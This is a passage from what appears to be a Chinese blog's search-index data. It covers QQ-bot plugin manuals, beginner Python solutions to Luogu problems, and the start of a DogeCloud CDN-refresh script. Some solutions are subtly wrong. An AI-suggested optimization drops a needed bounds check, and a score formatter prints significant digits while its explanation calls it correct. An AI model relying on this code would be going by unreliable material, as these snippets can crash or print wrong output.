&#x3D; 8 Mbps\n\n相关链接：https://zhuanlan.zhihu.com/p/682846252#/\n","categories":["学习笔记","计算机网络"],"tags":["学习笔记","计算机网络","传输速率"]},{"title":"Mirai Administrator 机器人管理插件，好友/群管理，黑名单，宵禁","url":"/posts/369f16e7.html","content":"Mirai Administrator\n基于 Mirai Console 的 管理员 Bot 及其标准\n\n\n使用前应该查阅的相关文档或项目\n\nUser Manual\nPermission Command\nChat Command\n\n本插件实现的功能有:\n\n联系人相关 自动审批，指令查看，用户留言\n消息相关 发送消息，撤回消息\n群管理相关 群消息审核，自动宵禁，自动清理不发言，禁言自动退群\n\n本插件提供服务接口以供其他插件拓展功能例如使用 Mirai Content Censor 依靠百度API审查群消息例如使用 Mirai Authenticator 验证加群请求\nMCL 指令安装请确认 mcl.jar 的版本是 2.1.0+./mcl --update-package xyz.cssxsh.mirai:mirai-administrator --channel maven-stable --type plugin\n指令注意: 使用前请确保可以 在聊天环境执行指令&lt;...&gt;中的是指令名[...]表示参数，当[...]后面带?时表示参数可选\n本插件指令权限ID 格式为 xyz.cssxsh.mirai.plugin.mirai-administrator:command.*, * 是指令的第一指令名例如 /send to 12345 的权限ID为 xyz.cssxsh.mirai.plugin.mirai-administrator:command.send对 机器人发送的联系人请求通知消息 回复 同意 或 不同意 或 拉黑 即可处理插件提供黑名单功能，使用指令 /contact black u12345, 即可拉黑用户，Bot将不响应用户动作（包括其他插件的功能）\nADMINCONTACTCOMMAND\n\n\nCommand\nDescription\n\n\n\n/&lt;contact&gt; &lt;delete&gt; [contact]\n删除联系人\n\n\n/&lt;contact&gt; &lt;handle&gt; [id] [accept]? [black]?\n处理联系人申请\n\n\n/&lt;contact&gt; &lt;request&gt;\n查看申请列表\n\n\n/&lt;contact&gt; &lt;black&gt; &#123;permitteeIds&#125;\n拉黑\n\n\n/&lt;contact&gt; &lt;white&gt; &#123;permitteeIds&#125;\n取消拉黑\n\n\n/&lt;contact&gt; &lt;backup&gt;\n触发备份功能\n\n\n\nid 是 事件id 或 好友id 或 群id\naccept 和 black 参数为 true, yes, enabled, on, 1 时表示 true (不区分大小写)\n对 机器人发送的新联系人通知消息 回复 同意 或 不同意 或 拉黑 即可处理，详见 联系人审批配置\npermitteeIds 是 权限系统的用户标识符，例如 m12345.6789, 可以提供多个 PermitteeId 一次性拉黑&#x2F;取消拉黑\n黑名单通过 @EventHandler(priority = EventPriority.HIGH, concurrency = ConcurrencyKind.LOCKED) 拦截消息\n\nADMINFRIENDCOMMAND\n\n\nCommand\nDescription\n\n\n\n/&lt;friend&gt; &lt;list&gt;\n好友列表\n\n\n/&lt;friend&gt; &lt;delete&gt; [friend]\n删除好友\n\n\nADMINGROUPCOMMAND\n\n\nCommand\nDescription\n\n\n\n/&lt;group&gt; &lt;list&gt;\n群列表\n\n\n/&lt;group&gt; &lt;member&gt; [group]\n群成员\n\n\n/&lt;group&gt; &lt;quit&gt; [group]\n退出群聊\n\n\n/&lt;group&gt; &lt;kick&gt; [member] [reason]? [black]?\n踢出群员\n\n\n/&lt;group&gt; &lt;nick&gt; [member] [nick]\n群昵称\n\n\n/&lt;group&gt; &lt;title&gt; [member] [title]\n群头衔\n\n\n/&lt;group&gt; &lt;mute&gt; [member] [second]\n禁言\n\n\n/&lt;group&gt; &lt;quiet&gt; [group] [open]?\n全体禁言\n\n\n/&lt;group&gt; &lt;admin&gt; [member] [operation]?\n设置管理员\n\n\n/&lt;group&gt; &lt;announce&gt; [group]\n设置公告\n\n\n/&lt;group&gt; &lt;rank&gt; [group] &#123;levels&#125;\n设置等级头衔\n\n\nADMINRECALLCOMMAND\n\n\nCommand\nDescription\n\n\n\n/&lt;recall&gt; [contact]?\n撤回消息\n\n\n\n不指定contact时，可以通过回复消息指定要撤销的消息，如果没有指定，将尝试撤销最后一条不是由指令发送者发送的消息\ncontact是群员时，将尝试撤销这个群员的最后一条消息\ncontact是群或好友时，将尝试撤销bot的最后一条消息\n\nADMINREGISTEREDCOMMAND\n\n\nCommand\nDescription\n\n\n\n/&lt;registered&gt;\n查看已注册指令\n\n\n/&lt;reg&gt;\n查看已注册指令\n\n\nADMINSENDCOMMAND\n\n\nCommand\nDescription\n\n\n\n/&lt;send&gt; &lt;groups&gt; [bot]? [at]? [second]?\n发送给所有群\n\n\n/&lt;send&gt; &lt;friends&gt; [bot]? [second]?\n发送给所有好友\n\n\n/&lt;send&gt; &lt;to&gt; [contact] [at]?\n发送给指定联系人\n\n\n/&lt;send&gt; &lt;nudge&gt; [user]\n戳一戳指定联系人\n\n\n/&lt;send&gt; &lt;log&gt; &#123;addresses&#125;\n备份日志到邮箱\n\n\n\nbot 参数在命令行模式下需要指定\nat 参数为 true, yes, enabled, on, 1 时表示 true, 将附加一个At\nsecond 参数为 延迟的秒数 例如 /send groups 123456 false 10\naddresses 参数为 邮箱地址\n\nADMINTIMERCOMMAND\n\n\nCommand\nDescription\n\n\n\n/&lt;timer&gt; &lt;config&gt;\n显示当前设置\n\n\n/&lt;timer&gt; &lt;mute&gt; [moment] [cron] [group]?\n宵禁\n\n\n/&lt;timer&gt; &lt;cleaner&gt; [day] [cron] [group]?\n清理不发言\n\n\n/&lt;timer&gt; &lt;status&gt; [cron] [bot]?\n定时发送机器人状态\n\n\n/&lt;timer&gt; &lt;message&gt; [cron] [target] [at]\n定时发送消息\n\n\n\ngroup 为 要操作的群，在群聊中可以不指定\ncron, 为 CRON 表达式, 由 秒 分钟 小时 日 月 周 组成例如 0 0 1 * * ? 表示每天 01:00 执行一次，0 30 2 ? * 2-6 表示星期一至星期五 每天 02:30 执行一次可以使用在线编辑器生成 https://www.bejson.com/othertools/cron/为防止被 空格 分成多个参数，请使用 &quot; 包裹参数\nmoment 为 DURATION 表达式, 由 PnDTnHnMn.nS 组成例如 P1DT2H3M4.5S 表示 一天二小时三分钟四点五秒，PT5H 表示 五小时\nmute 指令，moment 小于 0 宵禁就会关闭例如 /timer mute PT5H &quot;0 0 1 ? * 2-6&quot;, 将会在 星期一到星期五的凌晨01:00 禁言 5 小时例如 /timer mute PT0S &quot;0 0 0 1 * ?&quot;, 将会 取消 禁言定时器\nday 单位为天数的发言期限, 小于 0 宵禁就会关闭例如 /timer cleaner 365 &quot;0 0 12 ? * 0&quot;, 将会 取消 禁言定时器\n\n配置联系人审批配置\nAdminAutoApproverConfig.yml\n\n禁言自动退群配置\nAdminAutoQuitConfig.yml\nmute_limit 大于这个设置秒数的禁言会触发自动退群\n\n留言配置\nAdminCommentConfig.yml\nxyz.cssxsh.mirai.plugin.mirai-administrator:comment.include 作用: 拥有此权限的用户，可以给机器人留言\n\n机器人上线消息配置\nAdminOnlineMessageConfig.yml\nxyz.cssxsh.mirai.plugin.mirai-administrator:online.include 作用: 拥有此权限的群，会发送上线通知\n\n消息审查及机器人所有者\nAdminSetting.yml\ncensor_types 可选值 IMAGE, FLASH, SERVICE, APP, AUDIO, FORWARD, VIP, MARKET, MUSIC, POKE\n正则词库, 须手动添加，将会加载 censor 文件夹中的 txt 文件，每一行对应一个正则匹配，会监听文件改动，无需重启\n\n邮件配置\nAdminMailConfig.yml 配置一些默认的发送对象\nadmin.mail.properties 配置邮箱账号等\n\n格式参考\nmail.host=smtp.mail.qq.commail.auth=truemail.user=xxxmail.password=***mail.from=cssxsh@qq.commail.store.protocol=smtpmail.transport.protocol=smtp# smtpmail.smtp.starttls.enable=truemail.smtp.auth=truemail.smtp.timeout=15000\n\nQQ邮箱帮助： https://service.mail.qq.com/cgi-bin/help?subtype=1&amp;&amp;id=28&amp;&amp;no=1001256\n","categories":["QQbot"],"tags":["QQbot"]},{"title":"MuteGames使用手册","url":"/posts/7183a269.html","content":"MuteGames一个以 Mirai-Console 为基础开发并为了满足群友PVP需求和抖M需求开发的禁言游戏集合\n开始使用插件需要以 Mirai-Console\n为基础，你可以下载 MCL 作为你的Mirai插件载入器\n与此同时，本插件需要 Mirai 官方插件 \n使用之前请先用参考权限节点来开启插件权限\n请注意：当用户权限大于等于机器人所在权限时（如机器人是管理员用户为群主），机器人不会对游戏请求做任何回复\n权限节点|- com.evolvedghost.mutegames:*                      The base permission|  |- com.evolvedghost.mutegames:command.banme       自裁指令|  |- com.evolvedghost.mutegames:command.blackjack   21点（Blackjack）指令|  |- com.evolvedghost.mutegames:command.duel        决斗指令|  |- com.evolvedghost.mutegames:command.mg          MuteGams管理指令|  |- com.evolvedghost.mutegames:command.roulette    俄罗斯轮盘指令\n\n插件调用的是Mirai自带的权限管理系统，你可以在控制台输入?来获取帮助，通常权限的添加方式为：\n#permission add &lt;被许可人 ID&gt; &lt;权限 ID&gt;    # 授权一个权限\n\n&lt;被许可人 ID&gt; 可以为QQ号或者通配符*来代表所有用户\n&lt;权限 ID&gt; 即上述权限名称，可按照需求添加\n一个例子为：#permission add * com.evolvedghost.mutegames:*，即为所有用户添加本插件所有权限\n插件命令插件分为两种命令，一种为普通命令一种为管理员命令\n默认别名为插件预设置的alias，普通命令的别名你可以在Config中更改\n普通命令\n\n\n指令\n默认别名\n功能\n\n\n\n(#)banMe\n自裁\n自裁（直接获得一个禁言）\n\n\n(#)banMe [seconds]&lt;Int&gt;\n自裁 [seconds]&lt;Int&gt;\n自定义秒数禁言\n\n\n(#)duel\n决斗\n决斗指令（两位群友以决斗的方式赢取禁言）\n\n\n(#)roulette\n轮盘,俄罗斯轮盘\n俄罗斯轮盘赌（以轮盘赌的方式赢取禁言）\n\n\n(#)blackjack\n21点\n发起#加入一轮21点\n\n\n(#)blackjack start\n21点 开始\n开启一轮21点\n\n\n(#)blackjack add\n21点 拿牌\n在21点中拿牌\n\n\n(#)blackjack stop\n21点 停牌\n在21点中停牌\n\n\n(#)blackjack giveup\n21点 投降\n在21点中投降\n\n\n(#)blackjack check\n21点 看牌\n在21点中看牌\n\n\n(#)blackjack help\n21点 帮助\n获取21点帮助\n\n\n管理命令\n\n\n指令\n默认别名（不可更改）\n功能\n\n\n\n#mg dualStop\n#mg 停止决斗\n停止本群的决斗\n\n\n#mg reload\n#mg 重载\n重载本插件的配置项\n\n\n#mg rouletteStop\n#mg 停止轮盘\n停止本群的俄罗斯轮盘\n\n\n#mg bjStop\n#mg 停止21点\n停止本群的停止21点\n\n\n插件配置插件的配置项储存在config\\com.evolvedghost.mutegames目录下，有以下文件\n\n\n\n文件名\n作用\n\n\n\nadmin.yml\n配置管理员命令和插件基础设置\n\n\nbanMe.yml\n配置自裁设置\n\n\nduel.yml\n配置决斗设置\n\n\nroulette.yml\n配置轮盘赌设置\n\n\nblackjack.yml\n配置21点设置\n\n\n相应的设置在文件中应有详细注明\n编译如果您需要自行编译，使用在文件目录使用以下命令即可\nWindows：.#gradlew.bat buildPlugin\nLinux：.#gradlew buildPlugin\nMirai版本在2.12以下的用户需要向下兼容包，本项目Release并不会提供此类包，请自行编译，编译指令为：.#gradlew buildPluginLegacy\n编译好的jar文件可以在#build#mirai下找到\n特别感谢Mirai 提供QQ机器人\n","categories":["QQbot"],"tags":["QQbot"]},{"title":"P1152 欢乐的跳","url":"/posts/8efd2bf.html","content":"欢乐的跳题目描述一个 $n$ 个元素的整数数组，如果数组两个连续元素之间差的绝对值包括了 $[1,n-1]$ 之间的所有整数，则称之符合“欢乐的跳”，如数组 ${1,4,2,3}$ 符合“欢乐的跳”，因为差的绝对值分别为：$3,2,1$。\n给定一个数组，你的任务是判断该数组是否符合“欢乐的跳”。\n输入格式每组测试数据第一行以一个整数 $n(1 \\le n \\le 1000)$ 开始，接下来 $n$ 个空格隔开的在 $[-10^8,10^8]$ 之间的整数。\n输出格式对于每组测试数据，输出一行若该数组符合“欢乐的跳”则输出 Jolly，否则输出 Not jolly。\n样例 #1样例输入 #14 1 4 2 3\n\n样例输出 #1Jolly\n\n样例 #2样例输入 #25 1 4 2 -1 6\n\n样例输出 #2Not jolly\n\n提示$1 \\le n \\le 1000$\n题解Jolly_input = list(map(int, input().split()))n = Jolly_input[0]Jolly = []for i in range(1, len(Jolly_input)):    Jolly.append(Jolly_input[i])w1 = [0] * nfor i in range(n - 1):    abs_num = abs(Jolly[i] - Jolly[i + 1])    if abs_num &lt; n:        w1[abs_num] = 1count = 0for i in w1[1:]:    if i == 0:        count = 1if count == 0:    print(&quot;Jolly&quot;)else:    print(&quot;Not jolly&quot;)\n\n题解优化1这段代码已经实现了判断数组是否符合“欢乐的跳”的功能，但仍然可以进行一些优化：\n\n简化列表创建：在创建 Jolly 列表时，可以使用切片来简化代码。\n\n简化差的绝对值计算：可以在循环中直接计算差的绝对值，而不是使用 abs() 函数。\n\n简化检查逻辑：可以在循环中直接检查是否存在未被标记的差的绝对值，而不是使用计数器 count。\n\n使用生成器表达式：在最后判断是否存在未被标记的差的绝对值时，可以使用生成器表达式来判断，而不需要显式地创建一个计数器变量。\n\n\n下面是优化后的代码：\nJolly_input = list(map(int, input().split()))n = Jolly_input[0]Jolly = Jolly_input[1:]  # 简化列表创建w1 = [0] * nfor i in range(n - 1):    abs_num = abs(Jolly[i] - Jolly[i + 1])    if abs_num &lt; n:        w1[abs_num] = 1if 0 in w1[1:]:  # 使用生成器表达式检查是否存在未被标记的差的绝对值    print(&quot;Not jolly&quot;)else:    print(&quot;Jolly&quot;)\n\n通过这些优化，代码更加简洁和易读。\n题解优化2这段代码可以进行一些优化，提高效率和简洁性。下面是一些可能的优化点：\n\n不需要额外的 Jolly 列表： 可以在读取输入时直接忽略第一个元素，因为我们只关心元素之间的差值。\n\n不需要检查是否小于 n： 因为题目规定了连续元素之间的差的绝对值不超过 n-1，所以无需检查差的绝对值是否小于 n。\n\n不需要额外的计数器 count： 可以直接利用 w1 列表来判断是否存在未被标记的差的绝对值。\n\n优化遍历 w1 列表的方式： 可以使用 Python 的内置函数 any() 来判断列表中是否存在某个条件成立的元素。\n\n\n下面是优化后的代码：\nJolly_input = list(map(int, input().split()))n = Jolly_input[0]w1 = [0] * nfor i in range(1, n):    abs_num = abs(Jolly_input[i] - Jolly_input[i + 1])    w1[abs_num] = 1if any(i == 0 for i in w1[1:]):    print(&quot;Not jolly&quot;)else:    print(&quot;Jolly&quot;)\n\n这样，我们消除了额外的 Jolly 列表、计数器 count，并且更简洁地判断是否存在未被标记的差的绝对值。\n题解解释\n来自ChatGPT\n\n这段代码用于判断给定的整数数组是否符合“欢乐的跳”的条件。下面是代码的解释：\n\nJolly_input = list(map(int, input().split())): 这行代码接受用户输入的整数数组，并将其转换为整数列表。\n\nn = Jolly_input[0]: 获取输入列表的第一个元素，该元素表示数组的长度。\n\nJolly = []: 创建一个空列表 Jolly 用于存储输入列表中除了第一个元素以外的所有元素。\n\nfor i in range(1, len(Jolly_input)): Jolly.append(Jolly_input[i]): 这个循环将输入列表中除了第一个元素以外的所有元素添加到 Jolly 列表中。\n\nw1 = [0] * n: 创建一个长度为 n 的全零列表 w1，用于记录数组中差的绝对值。\n\nfor i in range(n - 1):: 这个循环遍历数组中的每对连续元素。\n\nabs_num = abs(Jolly[i] - Jolly[i + 1]): 计算当前元素和下一个元素的差的绝对值。\n\nif abs_num &lt; n: w1[abs_num] = 1: 如果差的绝对值小于 n，则将 w1 列表中索引为差的绝对值的元素标记为 1，表示该差的绝对值出现过。\n\ncount = 0: 初始化一个计数器 count 为 0，用于检查是否存在欢乐的跳。\n\nfor i in w1[1:]:: 这个循环遍历 w1 列表中除了第一个元素以外的所有元素。\n\nif i == 0: count = 1: 如果 w1 中有任何一个元素为 0，说明存在未被标记的差的绝对值，将 count 设置为 1。\n\nif count == 0: print(&quot;Jolly&quot;) else: print(&quot;Not jolly&quot;): 最后，根据 count 的值判断是否存在欢乐的跳，如果 count 为 0，表示所有的差的绝对值都被标记过，输出 “Jolly”，否则输出 “Not jolly”。\n\n\n综上所述，这段代码通过记录数组中差的绝对值是否被标记过来判断数组是否符合“欢乐的跳”的条件。\n知识点\nlist(map(int, input().split()))接受有空格间隔的连续输入\n\n通过切片来进行列表的自定义索引循环\n\n\n如果你想循环一个列表，并从索引 1 开始而不是从索引 0 开始，你可以使用 Python 中的切片。切片允许你从列表中选择一个子序列。对于循环来说，你可以使用切片来创建一个新的列表，从索引 1 开始，然后对这个新列表进行迭代。\n例如：\nmy_list = [10, 20, 30, 40, 50]# 从索引 1 开始循环for item in my_list[1:]:    print(item)\n\n在这个例子中，my_list[1:] 创建了一个新列表，其中包含从索引 1 到列表末尾的所有元素。然后，for 循环遍历这个新列表。这样就可以从索引 1 开始循环遍历原始列表了。\n注意：使用切片创建的是原列表的副本，因此对新列表的修改不会影响原列表。\n\nif的灵活运用\n\nif 0 in w1[1:]:  # 使用生成器表达式检查是否存在未被标记的差的绝对值\n\n\nif和any函数结合\n\nif any(i == 0 for i in w1[1:]):\n\n\nany函数\n\nany() 函数是 Python 中的一个内置函数，它用于检查可迭代对象中是否存在任何为真（即非零、非空、非空字符串、非空列表等）的元素。如果可迭代对象中至少有一个元素为真，则返回 True；否则，返回 False。\n以下是 any() 函数的基本语法：\nany(iterable)\n\n其中，iterable 是一个可迭代对象，比如列表、元组、集合、字典的键等。\n举个例子，假设我们有一个列表，想要检查其中是否有任何元素为偶数：\nmy_list = [1, 3, 5, 6, 7]result = any(x % 2 == 0 for x in my_list)print(result)  # 输出: True，因为列表中存在偶数 6\n\n在这个例子中，我们使用了生成器表达式来生成一个布尔值的迭代器，然后将其传递给 any() 函数。这个迭代器会遍历列表中的每个元素，检查它是否为偶数。因为列表中存在偶数 6，所以 any() 函数返回 True。\nany() 函数通常用于在条件中检查多个布尔值，以简化代码逻辑。\n碎碎念嗓子好疼，好困，今天就学到这吧，就刷了一道题\n","categories":["Python","蓝桥"],"tags":["Python","蓝桥","洛谷"]},{"title":"P5705 【深基2.例7】数字反转","url":"/posts/9e0fed2d.html","content":"【深基2.例7】数字反转题目描述输入一个不小于 $100$ 且小于 $1000$，同时包括小数点后一位的一个浮点数，例如 $123.4$ ，要求把这个数字翻转过来，变成 $4.321$ 并输出。\n输入格式一行一个浮点数\n输出格式一行一个浮点数\n样例 #1样例输入 #1123.4\n\n样例输出 #14.321\n\n题解fff = str(input())nnn = &quot;&quot;for i in fff[::-1]:    nnn += iprint(float(nnn))\n\n知识点这题也不难，学一下里面的知识点\n逆向循环可以通过切片来实现\nfor i in fff[::-1]:\n\n","categories":["Python","蓝桥"],"tags":["Python","蓝桥","洛谷"]},{"title":"P5707 【深基2.例12】上学迟到","url":"/posts/499d85c8.html","content":"【深基 2.例 12】上学迟到题目描述学校和 yyy 的家之间的距离为 $s$ 米，而 yyy 以 $v$ 米每分钟的速度匀速走向学校。\n在上学的路上，yyy 还要额外花费 $10$ 分钟的时间进行垃圾分类。\n学校要求必须在上午 $\\textrm{8:00}$  到达，请计算在不迟到的前提下，yyy 最晚能什么时候出门。\n由于路途遥远，yyy 可能不得不提前一点出发，但是提前的时间不会超过一天。\n输入格式一行两个正整数 $s,v$，分别代表路程和速度。\n输出格式输出一个 $24$ 小时制下的时间，代表 yyy 最晚的出发时间。\n输出格式为 $\\texttt{HH:MM}$，分别代表该时间的时和分。必须输出两位，不足前面补 $0$。\n样例 #1样例输入 #1100 99\n\n样例输出 #107:48\n\n提示对于 $100%$ 的数据，$1 \\le s,v \\le 10^4$。\n题解from datetime import datetime, timedeltas, v = map(int, input().split())t = s / v + 10  # 需要花费的总时间（分钟）ddl = datetime.strptime(&quot;08:00&quot;, &quot;%H:%M&quot;)time = timedelta(minutes=t)end_time = ddl - timeprint(end_time.strftime(&quot;%H:%M&quot;))\n\n题解解释这段代码用于解决一个问题，即计算在不迟到的前提下，某人最晚能什么时候出门以及什么时候到达学校。\n首先，代码从标准输入中读取两个整数，分别表示路程 s 和速度 v。这两个值是由空格分隔的。这段代码使用了 map(int, input().split()) 来同时读取输入的两个整数，并将其分别赋值给变量 s 和 v。\n接下来，计算需要花费的总时间 t。总时间等于路程 s 除以速度 v，再加上额外的 $10$ 分钟用于垃圾分类。因此，t = s / v + 10，单位是分钟。\n然后，使用 datetime.strptime(&quot;08:00&quot;, &quot;%H:%M&quot;) 将字符串时间 “08: 00” 转换为 datetime 对象，表示学校的到达时间。这里使用了 &quot;%H:%M&quot; 格式指定解析的时间格式。\n接着，使用 timedelta(minutes=t) 创建一个时间间隔对象，表示需要花费的总时间。\n最后，通过 ddl - time 计算出最晚出门的时间，即学校的到达时间减去需要花费的总时间，得到了 end_time。然后，通过 end_time.strftime(&quot;%H:%M&quot;) 将 end_time 格式化为 “%H:%M” 格式的字符串，并打印出来。\n整体而言，这段代码的作用是计算在不迟到的前提下，某人最晚能在什么时间出门。\n知识点利用这题学习一下时间的计算\n当涉及到时间计算时，这段代码涵盖了以下几个关键的知识点：\n\n时间表示：使用 datetime 模块中的 datetime 类来表示具体的时间点。\n时间间隔表示：使用 timedelta 类来表示时间间隔。\n时间格式化：使用 strftime 方法将 datetime 对象格式化为指定格式的字符串。\n时间加减法：通过 datetime 对象和 timedelta 对象进行加减法运算，实现时间的加减操作。\n时间字符串转换：使用 strptime 方法将字符串时间解析为 datetime 对象。\n\n这些知识点在处理时间相关的计算和操作时非常重要，并且在实际开发中经常会被用到。\n只想要结果保留小时和分钟部分，可以使用 strftime 方法来格式化输出结果。\n例如 print(end_time.strftime(&quot;%H:%M&quot;))\n","categories":["Python","蓝桥"],"tags":["Python","蓝桥","洛谷"]},{"title":"P5718 【深基4.例2】找最小值","url":"/posts/d9940956.html","content":"【深基 4.例 2】找最小值题目描述给出 $n$ 和 $n$ 个整数 $a_i$，求这 $n$ 个整数中最小值是什么。\n输入格式第一行输入一个正整数 $n$，表示数字个数。\n第二行输入 $n$ 个非负整数，表示 $a_1,a_2 \\dots a_n$，以空格隔开。\n输出格式输出一个非负整数，表示这 $n$ 个非负整数中的最小值。\n样例 #1样例输入 #181 9 2 6 0 8 1 7\n\n样例输出 #10\n\n提示数据保证，$n\\le100$ 且 $0\\le a_i \\le 1000$。\n题解n = int(input())ai = list(map(int, input().split()))print(min(ai))\n\n题解解释\nn = int(input()): 这一行代码首先接收用户输入的一个整数（假设表示整数个数），并通过 int() 函数将其转换成整型数据，然后将这个整数值赋给变量 n。\n\nai = list(map(int, input().split())): 这一行代码接收用户输入的一行以空格分隔的整数序列。input().split() 会获取用户输入的一行文本，并按空格进行分割，返回一个包含所有字符串子串的列表。接着，map(int, ...) 函数会将列表中的每个字符串元素转换成整数。最后，list(...) 将转换后的整数生成器表达式转换为列表。因此，ai 现在是一个包含 n 个整数的列表。\n\nprint(min(ai)): 这一行使用 Python 内置的 min() 函数，在列表 ai 中找到并返回最小的整数值，并通过 print() 函数将其打印出来。所以最终结果就是输出用户输入的所有整数中的最小值。\n\n\n知识点用这个题学习一下取最小函数\nmin()\n","categories":["Python","蓝桥"],"tags":["Python","蓝桥","洛谷"]},{"title":"P5726 【深基4.习9】打分","url":"/posts/904f42f7.html","content":"P5726 【深基4.习9】打分【深基4.习9】打分题目描述现在有 $n(n \\le 1000)$ 位评委给选手打分，分值从 $0$ 到 $10$。需要去掉一个最高分，去掉一个最低分（如果有多个最高或者最低分，也只需要去掉一个），剩下的评分的平均数就是这位选手的得分。现在输入评委人数和他们的打分，请输出选手的最后得分，精确到 $2$ 位小数。\n输入格式第一行输入一个正整数 $n$，表示有 $n$ 个评委。\n第二行输入 $n$ 个正整数，第 $i$ 个正整数表示第 $i$ 个评委打出的分值。\n输出格式输出一行一个两位小数，表示选手的最后得分。\n样例 #1样例输入 #159 5 6 8 9\n\n样例输出 #17.67\n\n提示数据保证，$3 \\leq n \\leq 1000$，每个评委打出的分值为为 $0$ 到 $10$（含 $0$ 与 $10$）之间的整数。\n题解n = int(input())score = list(map(int, input().split()))min = min(score)max = max(score)score.remove(min)score.remove(max)average = sum(score) / len(score)print(&quot;&#123;:.3&#125;&quot;.format(average))\n\n题解解释这段代码是一个Python程序，用于计算选手的最后得分。下面是对代码的解释：\n\n程序首先从标准输入中读取评委的人数 $n$。\n接下来，程序从标准输入中读取了一行，其中包含了 $n$ 个评委给选手的打分，这些打分用空格分隔开。\n然后，程序将这些分数转换为整数并存储在名为 score 的列表中。\n程序找到了列表中的最低分和最高分，通过使用 min() 和 max() 函数来实现。\n接着，程序使用 remove() 函数将最低分和最高分从列表中删除，这样列表中就只剩下了去掉最低分和最高分后的评委分数。\n程序计算剩下评委的分数的平均值，通过求和所有分数并除以剩余评委的数量来实现。\n最后，程序使用 format() 函数将平均值格式化为两位小数，并将结果打印到标准输出。\n\n这段代码的逻辑是合理的，能够正确计算选手的最终得分。\n知识点这段代码涉及了几个Python编程的知识点：\n\n输入输出：使用 input() 函数从标准输入读取数据，并使用 print() 函数将结果输出到标准输出。\n列表操作：使用列表来存储评委的打分，并对列表进行操作，如查找最大值、最小值以及删除元素。\n循环与条件语句：虽然代码中没有显式的循环或条件语句，但在某种程度上，使用了内置函数 min() 和 max() 来找到最低分和最高分，这可以视为在列表元素上进行了一种隐式的遍历和比较。\n字符串格式化：使用 format() 函数对浮点数进行格式化，以保留指定位数的小数位数。\n数学计算：计算列表中元素的和以及求列表的长度，用于计算评委得分的平均值。\n\n综上所述，这段代码涵盖了Python中的一些基本概念，包括输入输出、数据结构、条件语句、循环、字符串格式化和数学计算。\n代码改进# 读取评委人数和打分n = int(input())score = [int(x) for x in input().split()]# 去除最高分和最低分score = sorted(score)[1:-1]# 计算平均分并输出average = sum(score) / len(score)print(&quot;&#123;:.2f&#125;&quot;.format(average))\n","categories":["Python","蓝桥"],"tags":["Python","蓝桥","洛谷"]},{"title":"Peter 的烟","url":"/posts/80cc5efe.html","content":"Peter 的烟题目背景温馨提醒：吸烟有害健康，请勿尝试吸烟！\n题目描述Peter 有 $n$ 根烟，他每吸完一根烟就把烟蒂保存起来，$k$（$k&gt;1$）个烟蒂可以换一个新的烟，那么 Peter 最终能吸到多少根烟呢？\n与某些脑筋急转弯不同的是，Peter 并不能从异次元借到烟蒂，抽完后再还回去。\n输入格式每组测试数据一行包括两个整数 $n, k$（$1 &lt; n, k \\le 10^8$）。\n输出格式对于每组测试数据，输出一行包括一个整数表示最终烟的根数。\n样例 #1样例输入 #14 3\n\n样例输出 #15\n\n样例 #2样例输入 #210 3\n\n样例输出 #214\n\n提示对于 $100%$ 的数据，$1&lt;n, k \\le 10^8$。\n题解n, k = map(int, input().split())sum_smoke = nsum_di = nwhile int(sum_di / k) &gt; 0:    sum_smoke += int(sum_di / k)    sum_di = int(sum_di / k) + int(sum_di % k)print(sum_smoke)\n\n解释第一行读取两个输入\n第二行第三行定义烟的总数和烟蒂的总数\n初始化烟和烟蒂肯定都是n\n然后执行循环，判断，如果还能换烟，就执行循环体\n循环体内容是把换来的烟加到烟的总数，然后重置烟蒂的数量。\n\n这边有个注意的点就是，烟蒂的数量是换完之后剩下换不了的烟蒂加上换来的烟（抽完就是烟蒂），我第一次没有加换之前剩余的，所以有一个没通过\n\n最后输出烟的总数\n知识点整除取整整除取余\n","categories":["Python","蓝桥"],"tags":["Python","蓝桥","洛谷"]},{"title":"Python+多吉云api实现脚本刷新CDN缓存","url":"/posts/51225c3e.html","content":"把下面代码复制之后，修改自己的key，直接跑就行\n在大佬的代码基础上增加了可选择的刷新形式\nfrom hashlib import sha1import hmacimport requestsimport jsonimport urllibdef dogecloud_api(api_path, data=&#123;&#125;, json_mode=False):    &quot;&quot;&quot;    调用多吉云API    :param api_path:    调用的 API 接口地址，包含 URL 请求参数 QueryString，例如：/console/vfetch/add.json?url=xxx&amp;a=1&amp;b=2    :param data:        POST 的数据，字典，例如 &#123;&#x27;a&#x27;: 1, &#x27;b&#x27;: 2&#125;，传递此参数表示不是 GET 请求而是 POST 请求    :param json_mode:   数据 data 是否以 JSON 格式请求，默认为 false 则使用表单形式（a=1&amp;b=2）    :type api_path: string    :type data: dict    :type json_mode bool    :return dict: 返回的数据    &quot;&quot;&quot;    # 这里替换为你的多吉云永久 AccessKey 和 SecretKey，可在用户中心 - 密钥管理中查看    # 请勿在客户端暴露 AccessKey 和 SecretKey，否则恶意用户将获得账号完全控制权    access_key = &quot;XXXXXXXX&quot;    secret_key = &quot;XXXXXXXX&quot;    # 构造请求正文和 MIME 类型    if json_mode:        body = json.dumps(data)        mime = &quot;application/json&quot;    else:        body = urllib.parse.urlencode(data)        mime = &quot;application/x-www-form-urlencoded&quot;    # 构造签名字符串并计算签名    sign_str = api_path + &quot;\\n&quot; + body    signed_data = hmac.new(secret_key.encode(&quot;utf-8&quot;), sign_str.encode(&quot;utf-8&quot;), sha1)    sign = signed_data.digest().hex()    # 构造 Authorization 头部    authorization = &quot;TOKEN &quot; + access_key + &quot;:&quot; + sign    # 发起请求    response = requests.post(        &quot;https://api.dogecloud.com&quot; + api_path,        data=body,        headers=&#123;&quot;Authorization&quot;: authorization, &quot;Content-Type&quot;: mime&#125;,    )    # 返回响应的 JSON 数据    return response.json()def select_operation():    &quot;&quot;&quot;    用户选择操作类型    :return string: 用户选择的操作类型    &quot;&quot;&quot;    print(&quot;请选择操作类型：&quot;)    print(&quot;1. 刷新 URL 操作&quot;)    print(&quot;2. 刷新目录操作&quot;)    print(&quot;3. 预热 URL 操作&quot;)    choice = input(&quot;请输入选项（1/2/3）：&quot;)    if choice in [&quot;1&quot;, &quot;2&quot;, &quot;3&quot;]:        return choice    else:        print(&quot;无效的选择&quot;)        return None# 获取用户选择的操作类型rtype_choice = select_operation()if rtype_choice:    # 根据操作类型构造数据    if rtype_choice == &quot;1&quot;:        rtype = &quot;url&quot;        urls_input = input(&quot;请输入需要刷新的 URL 列表，以逗号分隔：&quot;)    elif rtype_choice == &quot;2&quot;:        rtype = &quot;path&quot;        urls_input = input(&quot;请输入需要刷新的目录列表，以逗号分隔：&quot;)    else:        rtype = &quot;prefetch&quot;        urls_input = input(&quot;请输入需要预热的 URL 